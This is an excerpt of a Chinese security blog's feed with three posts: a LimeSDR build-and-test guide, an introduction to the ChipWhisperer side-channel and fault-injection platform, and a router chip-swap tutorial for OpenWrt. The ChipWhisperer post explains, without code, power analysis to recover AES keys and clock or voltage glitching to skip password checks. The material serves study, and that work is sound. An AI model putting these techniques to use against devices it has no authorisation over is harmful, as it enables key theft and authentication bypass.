    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>LimeSDR 是一款完全开源的SDR产品，和 HackRF 一样，包括 PCB 设计图，FPGA 代码，HOST代码完全公开，方便研究和学习 SDR 系统原理。虽然市面上有很多 SDR 产品，但很少有像 LimeSDR 性价比这么高的。</p>
<p>LimeSDR 支持 100kHz 到 3.8GHz 频率范围，已经可以不需外置上变频器，即可完成短波应用的使用，另外LimeSDR 是一款完全开源的SDR产品包含了 2×2 MIMO 的支持，满足了大部分应用场景。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b90f617c7.png" alt=""></p>
<p>通过它的一些应用来了解一下其灵活性：<br>蜂窝网络、WiFi、蓝牙、IoT协议（LoRa/SigFox等）、导航、气象信息、航空信息、海事信息、空间通信、还有广播和电视。</p>
<p>这只是 LimeSDR 应用场景的一小部分，你可以应用到你能想到的任何领域。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75c152a8b34.jpg" alt=""></p>
<h2 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h2><h3 id="软件结构"><a href="#软件结构" class="headerlink" title="软件结构"></a>软件结构</h3><p>Lime Suite 是一款支持多种硬件平台的软件，包括LimeSDR，LMS7002M收发器，以及使用基于 LMS7 开发的其他硬件。安装 Lime Suite 可以使许多 SDR 应用程序（如GQRX）可以通过中间适配组件 SoapySDR 适配多种 SDR 设备配合使用。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75c56bdcda8.png" alt=""></p>
<p>SoapySDR 是位于 LimeSDR 的驱动程序和 SDR 应用程序之间的胶水层。使用一个简单的包装器 (SoapyLMS7), LimeSDR 可以在任何 SoapySDR 或 Gr-OsmoSDR 支持的应用程序中使用。这包括编程环境, 如 Pothos 框架和 GNU Radio，以及像 GQRX 和 CubicSDR 这样的图形应用程序。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75c571305ca.png" alt=""></p>
<h3 id="安装UHD"><a href="#安装UHD" class="headerlink" title="安装UHD"></a>安装UHD</h3><p>Wiki：<a href="http://files.ettus.com/manual/page_build_guide.html" rel="external nofollow noopener noreferrer" target="_blank">http://files.ettus.com/manual/page_build_guide.html</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libboost-all-dev libusb-1.0-0-dev python-mako doxygen python-docutils cmake build-essential git</span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/EttusResearch/uhd</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> uhd</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> host &amp;&amp; mkdir build &amp;&amp; <span class="built_in">cd</span> build</span></div><div class="line"><span class="meta">$</span><span class="bash"> cmake ../</span></div><div class="line"><span class="meta">$</span><span class="bash"> make -j5</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span></div></pre></td></tr></table></figure></p>
<h3 id="安装SoapySDR"><a href="#安装SoapySDR" class="headerlink" title="安装SoapySDR"></a>安装SoapySDR</h3><p>Wiki：<a href="https://github.com/pothosware/SoapySDR/wiki/BuildGuide" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/pothosware/SoapySDR/wiki/BuildGuide</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install cmake g++ libpython-dev python-numpy swig</span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/pothosware/SoapySDR.git</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> SoapySDR</span></div><div class="line"><span class="meta">$</span><span class="bash"> git pull origin master</span></div><div class="line"><span class="meta">$</span><span class="bash"> mkdir build &amp;&amp; <span class="built_in">cd</span> build</span></div><div class="line"><span class="meta">$</span><span class="bash"> cmake ..</span></div><div class="line"><span class="meta">$</span><span class="bash"> make -j5</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span></div></pre></td></tr></table></figure></p>
<h3 id="安装SoapyUHD"><a href="#安装SoapyUHD" class="headerlink" title="安装SoapyUHD"></a>安装SoapyUHD</h3><p>Wiki：<a href="https://github.com/pothosware/SoapyUHD/wiki" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/pothosware/SoapyUHD/wiki</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/pothosware/SoapyUHD.git</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> SoapyUHD</span></div><div class="line"><span class="meta">$</span><span class="bash"> mkdir build &amp;&amp; <span class="built_in">cd</span> build</span></div><div class="line"><span class="meta">$</span><span class="bash"> cmake ..</span></div><div class="line"><span class="meta">$</span><span class="bash"> make</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div></pre></td></tr></table></figure></p>
<h3 id="安装LimeSuite"><a href="#安装LimeSuite" class="headerlink" title="安装LimeSuite"></a>安装LimeSuite</h3><p>Wiki：<a href="http://wiki.myriadrf.org/Lime_Suite" rel="external nofollow noopener noreferrer" target="_blank">http://wiki.myriadrf.org/Lime_Suite</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo add-apt-repository -y ppa:myriadrf/drivers</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install git g++ cmake libsqlite3-dev libsoapysdr-dev libi2c-dev libusb-1.0-0-dev libwxgtk3.0-dev freeglut3-dev</span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/myriadrf/LimeSuite.git</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> LimeSuite</span></div><div class="line"><span class="meta">$</span><span class="bash"> mkdir builddir &amp;&amp; <span class="built_in">cd</span> builddir</span></div><div class="line"><span class="meta">$</span><span class="bash"> cmake ../</span></div><div class="line"><span class="meta">$</span><span class="bash"> make -j5</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span></div></pre></td></tr></table></figure></p>
<p>输入下列命令使非ROOT用户可以访问LimeSDR这样基于USB的设备<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> LimeSuite/udev-rules</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo sh ./install.sh</span></div></pre></td></tr></table></figure></p>
<p>安装上述驱动后，运行命令检查驱动是否安装成功<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75cab7f3135.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75cabd28388.png" alt=""></p>
<p>然后查看能不能找到设备<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75cac1b4a75.png" alt=""></p>
<h3 id="安装GNU-Radio、gr-osmosdr"><a href="#安装GNU-Radio、gr-osmosdr" class="headerlink" title="安装GNU Radio、gr-osmosdr"></a>安装GNU Radio、gr-osmosdr</h3><p>Wiki：<a href="https://www.gnuradio.org/doc/doxygen/build_guide.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.gnuradio.org/doc/doxygen/build_guide.html</a><br>从源码构建<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get -y install git-core cmake g++ python-dev swig \</span></div><div class="line"><span class="meta">$</span><span class="bash"> pkg-config libfftw3-dev libboost-all-dev libcppunit-dev libgsl0-dev \</span></div><div class="line"><span class="meta">$</span><span class="bash"> libusb-dev libsdl1.2-dev python-wxgtk3.0 python-numpy \</span></div><div class="line"><span class="meta">$</span><span class="bash"> python-cheetah python-lxml doxygen libxi-dev python-sip \</span></div><div class="line"><span class="meta">$</span><span class="bash"> libqt4-opengl-dev libqwt-dev libfontconfig1-dev libxrender-dev \</span></div><div class="line"><span class="meta">$</span><span class="bash"> python-sip python-sip-dev python-qt4 python-sphinx libusb-1.0-0-dev \</span></div><div class="line"><span class="meta">$</span><span class="bash"> libcomedi-dev libzmq-dev</span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> --recursive https://github.com/gnuradio/gnuradio.git</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> gnuradio &amp;&amp; mkdir build &amp;&amp; <span class="built_in">cd</span> build</span></div><div class="line"><span class="meta">$</span><span class="bash"> cmake ../</span></div><div class="line"><span class="meta">$</span><span class="bash"> make -j5</span></div><div class="line"><span class="meta">$</span><span class="bash"> make <span class="built_in">test</span></span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div></pre></td></tr></table></figure></p>
<p>安装gr-osmosdr支持包<br>Wiki：<a href="http://osmocom.org/projects/gr-osmosdr/wiki" rel="external nofollow noopener noreferrer" target="_blank">http://osmocom.org/projects/gr-osmosdr/wiki</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libsoapysdr-dev gr-fcdproplus</span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://git.osmocom.org/gr-osmosdr</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> gr-osmosdr &amp;&amp; mkdir build &amp;&amp; <span class="built_in">cd</span> build/</span></div><div class="line"><span class="meta">$</span><span class="bash"> cmake ../</span></div><div class="line"><span class="meta">$</span><span class="bash"> make</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span></div></pre></td></tr></table></figure></p>
<p>安装之后，会看到Soapysdr support在Gnuradio enabled里<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75cc570512a.png" alt=""></p>
<h2 id="测试LimeSDR接收、发射通道"><a href="#测试LimeSDR接收、发射通道" class="headerlink" title="测试LimeSDR接收、发射通道"></a>测试LimeSDR接收、发射通道</h2><p>GNU Radio和gr-osmosdr安装完成后，我们加载一个接收信号的grc流程图<br>Grc流程图下载地址：<a href="https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5" rel="external nofollow noopener noreferrer" target="_blank">https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5</a><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b80f982d0.png" alt=""></p>
<p>RF增益设置为20，IF中频增益设置成12，BB基带增益设置成19<br>天线设置为LNAL 对应的是RX Channel 0<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b8266f403.png" alt=""></p>
<p>然后运行，按下遥控钥匙，可以看到成功接收到433MHz遥控钥匙的信号，说明GNU Radio和gr-osmosdr安装没有问题。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b8302335b.png" alt=""></p>
<p>测试通完接收通道后，我们测试下发射通道，做一个小型FM电台试试<br>*注意请在不干扰正常无线通讯的基础上进行实验<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b8370cdd9.png" alt=""></p>
<p>在另一台电脑上打开SDRSharp将FM频率调到104MHz可以明显看到我们发射的信号<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b5b1a8de685f.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;LimeSDR 是一款完全开源的SDR产品，和 HackRF 一样，包括 PCB 设计图，FPGA 代码，HOST代码完全公开，方便研究和学
    
    </summary>
    
      <category term="无线电安全" scheme="http://www.future-sec.com/categories/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="LimeSDR" scheme="http://www.future-sec.com/tags/LimeSDR/"/>
    
      <category term="无线电" scheme="http://www.future-sec.com/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/"/>
    
  </entry>
  
  <entry>
    <title>芯片物理攻击平台 ChipWhisperer 初探</title>
    <link href="http://www.future-sec.com/ChipWhisperer-introduce.html"/>
    <id>http://www.future-sec.com/ChipWhisperer-introduce.html</id>
    <published>2018-08-19T16:00:00.000Z</published>
    <updated>2018-08-21T04:57:40.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>传统基于穷举或纯数学理论层面的分析，对于现代高强度加密算法而言，算力有限导致无法实现穷举，算法的复杂性也无法通过数学工具直接破解，根据近代物理学发展出来的理论，电子设备依赖外部电源提供动力，设备在运行过程中会消耗能量，同时会跟外界环境存在声、光、电、磁等物理交互现象产生，设备本身也可能存在设计薄弱点，通过这些物理泄露或人为进行物理层的修改获取数据，然后运用各类数学工具和模型实现破解。</p>
<p>然而在做物理攻击时，往往需要昂贵的设备，并要具备数学、物理学、微电子学、半导体学、密码学、化学等等多学科的交叉理论知识，因此其技术门槛和攻击成本都很高，目前在刚刚结束的 Blackhat 2018 上，展台上展示了多款 ChipWhisperer 硬件工具,作为亲民型的物理攻击平台，获得了一致的好评。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b757e51c171d.jpg" alt=""><br>(图片来源 Newae 官方)</p>
<p>ChipWhisperer Lite 版官方商店售价 $250 ，不管是实验学习，还是实战入门，都是极具性价比的，本文主要介绍主流的一些物理攻击手段，以及对 ChipWhisperer 的初步认知，后续将会据此从理论、原理、实验以及实战等角度详细介绍该平台。</p>
<h2 id="物理攻击"><a href="#物理攻击" class="headerlink" title="物理攻击"></a>物理攻击</h2><p>真正的安全研究不能凌驾于真实的攻防场景，对于物联网安全而言，其核心目标是真实物理世界中的各种硬件设备，真实的攻击场景往往发生在直接针对硬件设备的攻击，因此物联网安全的基石在于物理层的安全，而针对物联网物理攻击手段，是当前物联网面临的最大安全风险之一。</p>
<p>物理攻击就是直接攻击设备本身和运行过程中的物理泄露，根据攻击过程和手段可以分为非侵入攻击、半侵入式攻击和侵入式攻击。ChipWhisperer 平台主要用做非侵入式攻击，包括侧信道和故障注入攻击等。</p>
<p>传统密码分析学认为一个密码算法在数学上安全就绝对安全,这一思想被Kelsey等学者在1998年提出的侧信道攻击(Side-channel Attacks,SCA)理论所打破。侧信道攻击与传统密码分析不同,侧信道攻击利用功耗、电磁辐射等方式所泄露的能量信息与内部运算操作数之间的相关性,通过对所泄露的信息与已知输入或输出数据之间的关系作理论分析,选择合适的攻击方案,获得与安全算法有关的关键信息。目前侧信道理论发展越发迅速，从最初的简单功耗分析（SPA），到多阶功耗分析（CPA），碰撞攻击、模板攻击、电磁功耗分析以及基于人工智能和机器学习的侧信道分析方式，侧信道攻击方式也推陈出新，从传统的直接能量采集发展到非接触式采集、远距离采集、行为侧信道等等。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75d2d4909b4.png" alt=""><br>利用麦克风进行声波侧信道</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75d2e0a0337.png" alt=""><br>利用软件无线电实施非接触电磁侧信道</p>
<p>故障攻击就是在设备执行加密过程中，引入一些外部因素使得加密的一些运算操作出现错误，从而泄露出跟密钥相关的信息的一种攻击。一些基本的假设：设定的攻击目标是中间状态值； 故障注入引起的中间状态值的变化；攻击者可以使用一些特定算法（故障分析）来从错误/正确密文对中获得密钥。<br>使用故障的不同场景： 利用故障来绕过一些安全机制（口令检测，文件访问权限，安全启动链）；产生错误的密文或者签名（故障分析）；组合攻击（故障+旁路）。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75cdb77361a.png" alt=""><br>非侵入式电磁注入</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75cdd85fc54.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75ce4f3b061.png" alt=""><br>半侵入式光子故障注入</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75cee97b9cb.png" alt=""><br>侵入式故障注入</p>
<h2 id="ChipWhisperer"><a href="#ChipWhisperer" class="headerlink" title="ChipWhisperer"></a>ChipWhisperer</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本系列使用的版本是  CW1173 ChipWhisperer-Lite ，搭载 SAKURA-G 实验板，配合一块 CW303 XMEGA 作为目标测试板。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b7a9d9287a75.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b7a9d9c0bf77.jpg" alt=""></p>
<p>CW1173 是基于FPGA实现的硬件，软件端基于 python，具有丰富的扩展接口和官方提供的各类 API 供开发调用，硬件通过自带的 OpenADC 模块可以实现波形的捕获，不需要额外的示波器。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b756e8a59f7b.png" alt=""></p>
<p>板上自带有波形采集端口（MeaSure）和毛刺输出（Glitch）端口，并自带 MOSFET 管进行功率放大。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5we5t3654h.jpg" alt=""></p>
<p>并提供多种接口触发设置，基本满足一般的攻击需求。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5dgy2565fe.jpg" alt=""></p>
<h3 id="能量攻击"><a href="#能量攻击" class="headerlink" title="能量攻击"></a>能量攻击</h3><p>芯片物理结构为许多CMOS电路组合而成，CMOS 电路根据输入的不同电信号动态改变输出状态，实现0或1的表示，完成相应的运算，而不同的运算指令就是通过 CMOS 组合电路完成的，但 CMOS电路根据不同的输入和输出，其消耗的能量是不同的，例如汇编指令 ADD 和 MOV ，消耗的能量是不同的，同样的指令操作数不同，消耗的能量也是不同的，例如 MOV 1 和 MOV 2其能量消耗就是不同的，能量攻击就是利用芯片在执行不同的指令时，消耗能量不同的原理，实现秘钥破解。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b7582856ba4f.png" alt=""></p>
<p>常用的能量攻击方式就是在芯片的电源输入端（VCC）或接地端（GND）串联一个1到50欧姆的电阻，然后用示波器不断采集电阻两端的电压变化，形成波形图，根据欧姆定律，电压的变化等同于功耗的变化，因此在波形图中可以观察到芯片在执行不同加密运算时的功耗变化。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75816101da2.png" alt=""></p>
<p>CW1173 提供能量波形采集端口，通过连接 板上的 MeaSure SMA 接口，就可以对能量波形进行采集，在利用chipwhisperer 开源软件就可以进行分析，可以实现简单能量分析、CPA攻击、模板攻击等。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b757f60339ab.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b757f906ba76.png" alt=""><br>通过 cpa 攻击 AES 加密算法获取密钥</p>
<h3 id="毛刺攻击"><a href="#毛刺攻击" class="headerlink" title="毛刺攻击"></a>毛刺攻击</h3><p>ChipWhisperer  提供对时钟、电压毛刺的自动化攻击功能，类似于 web 渗透工具 Burpsuite ，可以对毛刺的宽度、偏移、位置等等参数进行 fuzz ，通过连接板上的 Glitch SMA 接口，就可以输出毛刺，然后通过串口、web 等获取结果，判断毛刺是否注入成功。</p>
<p>时钟毛刺攻击是针对微控制器需要外部时钟晶振提供时钟信号，通过在原本的时钟信号上造成一个干扰，通过多路时钟信号的叠加产生时钟毛刺，也可以通过自定义的时钟选择器产生，CW1173  提供高达 300MHZ 的时钟周期控制，时钟是芯片执行指令的动力来源，通过时钟毛刺可以跳过某些关键逻辑判断，或输出错误数据。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b76d1077021e.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b76d0fef3796.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/588201161020.jpg" alt=""><br>通过 CW1173 时钟毛刺攻击跳过密码验证</p>
<p>电压毛刺是对芯片电源进行干扰造成故障，在一个很短的时间内，使电压迅速下降，造成芯片瞬间掉电，然后迅速恢复正常，确保芯片继续正常工作，可以实现如对加密算法中某些轮运算过程的干扰，造成错误输出，或跳过某些设备中的关键逻辑判断等等 。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/1sdt4543h54.jpg" alt=""></p>
<p>对嵌入式设备的电压毛刺攻击</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>随着物理攻击理论和技术的进步，针对硬件芯片的防护手段也随之提高，芯片物理层的攻防一直在不断角力 ，现实环境中，能量采集会受到各种噪声因素的干扰，硬件厂商也会主动实施一些针对物理攻击的防护，单纯依靠  ChipWhisperer 平台难以实现真实场景的攻击，因此还需要结合电磁、声波、红外、光子等多重信息，以及对硬件进行修改，多重故障注入，引入智能分析模型等等组合手段，今后会进一步介绍一些基于 ChipWhisperer  的高级攻击方式和实战分析方法。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>ChipWhisperer 官网 wiki <a href="https://wiki.newae.com/Main_Page" rel="external nofollow noopener noreferrer" target="_blank">https://wiki.newae.com/Main_Page</a></li>
<li>开源项目 <a href="https://github.com/newaetech/chipwhisperer" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/newaetech/chipwhisperer</a></li>
<li>ChipSHOUTER 电磁故障平台  <a href="https://github.com/newaetech/ChipSHOUTER" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/newaetech/ChipSHOUTER</a></li>
<li>USB 附加模块  <a href="https://github.com/scanlime/facewhisperer" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/scanlime/facewhisperer</a></li>
<li>深度学习侧信道攻击 <a href="https://www.riscure.com/publication/lowering-bar-deep-learning-side-channel-analysis/" rel="external nofollow noopener noreferrer" target="_blank">https://www.riscure.com/publication/lowering-bar-deep-learning-side-channel-analysis/</a></li>
<li>使用毛刺攻击提取汽车 ECU 固件 <a href="https://www.riscure.com/publication/fault-injection-automotive-diagnostic-protocols/" rel="external nofollow noopener noreferrer" target="_blank">https://www.riscure.com/publication/fault-injection-automotive-diagnostic-protocols/</a></li>
<li>《物联网安全百科》 <a href="https://iot-security.wiki" rel="external nofollow noopener noreferrer" target="_blank">https://iot-security.wiki</a></li>
</ol>
<!--  -->]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;传统基于穷举或纯数学理论层面的分析，对于现代高强度加密算法而言，算力有限导致无法实现穷举，算法的复杂性也无法通过数学工具直接破解，根据近代物
    
    </summary>
    
      <category term="芯片安全" scheme="http://www.future-sec.com/categories/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="物理攻击" scheme="http://www.future-sec.com/tags/%E7%89%A9%E7%90%86%E6%94%BB%E5%87%BB/"/>
    
      <category term="芯片安全" scheme="http://www.future-sec.com/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
      <category term="ChipWhisperer" scheme="http://www.future-sec.com/tags/ChipWhisperer/"/>
    
      <category term="侧信道攻击" scheme="http://www.future-sec.com/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
    
      <category term="毛刺攻击" scheme="http://www.future-sec.com/tags/%E6%AF%9B%E5%88%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>物联网安全硬件修改系列-硬改</title>
    <link href="http://www.future-sec.com/iot-security-hardware-modification.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-modification.html</id>
    <published>2018-06-26T16:00:00.000Z</published>
    <updated>2018-08-20T11:21:17.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的硬件架构，替换大容量的内存和闪存芯片，使之能够刷openwrt系统；对某些设备进行配置层的升级，如iPhone，小米等手机内存扩容，使之具有更大容量的存储空间和运行内存； 以及对设备的破解，例如ps,xbox等游戏主机系列的硬破、软破，还有对各种加密录音笔，摄像头，加密U盘和硬盘的破解。<br>研究硬件修改对硬件diy改造，以及厂商在硬件层的安全防护具有非常重要意义。硬件层修改分为硬改和软改两个部分，硬改是对硬件中芯片和电路的改造、替换等，软改是针对芯片固件的修改、重打包等。本节将用具体的几个实例展示如何对设备进行硬改。</p>
<h2 id="硬改路由器刷openwrt"><a href="#硬改路由器刷openwrt" class="headerlink" title="硬改路由器刷openwrt"></a>硬改路由器刷openwrt</h2><h3 id="修改方案"><a href="#修改方案" class="headerlink" title="修改方案"></a>修改方案</h3><p>目前市面上主流的路由器，平时家用功能或许够用，但如果需要一些高级功能，比如屏蔽广告，挂vpn等等又难以实现，而采用openwrt系统可以充分满足定制化和diy的需求，openwrt是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，但如果专门购买openwrt系统的路由器，价格却又不是十分亲民，如果能把传统路由器通过硬件修改，刷入openwrt系统，就是个低成本的解决方案了，本次用来硬改的路由器具体参数如下：品牌：TP-Link， 型号：WR842N，版本：v4.3，采用高通QCA9533的主控，16M的闪存、2M的flash芯片，虽然是老机器，但除了不能外接usb，基本满足需求，当然价格也便宜。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_150638.jpg" alt=""></p>
<p>不得不说TP-Link最近出的机器，硬件缩水越来越严重，新的机器，闪存都集成到了CPU里面，基本没有硬改的空间了。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613_174407.jpg" alt=""></p>
<h3 id="更换内存芯片"><a href="#更换内存芯片" class="headerlink" title="更换内存芯片"></a>更换内存芯片</h3><p>openwrt系统最低硬件配置需要32M内存+8M存储芯片，因此需要更换机器上对应的两块芯片，下图红框部分。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_15063822.jpg" alt=""></p>
<p>首先更换内存芯片，换上64M内存芯片，新手的话，建议通过风枪来拆芯片，先用胶带保护一下芯片周围的元件，防止吹飞掉，加点助焊膏，温度稍微高一点。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160529.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152140.jpg" alt=""></p>
<p>芯片拆下后，先清洁一下焊盘，用吸锡线去掉焊盘上残余的锡，使焊盘平整，便于对齐芯片引脚。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152132.jpg" alt=""></p>
<p>清洁完成后，换上64M芯片，注意芯片上的小圆点就是第一脚，需要跟焊盘上的右下角的小圆点对齐，方向不对，芯片就白焊了。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154431.jpg" alt=""></p>
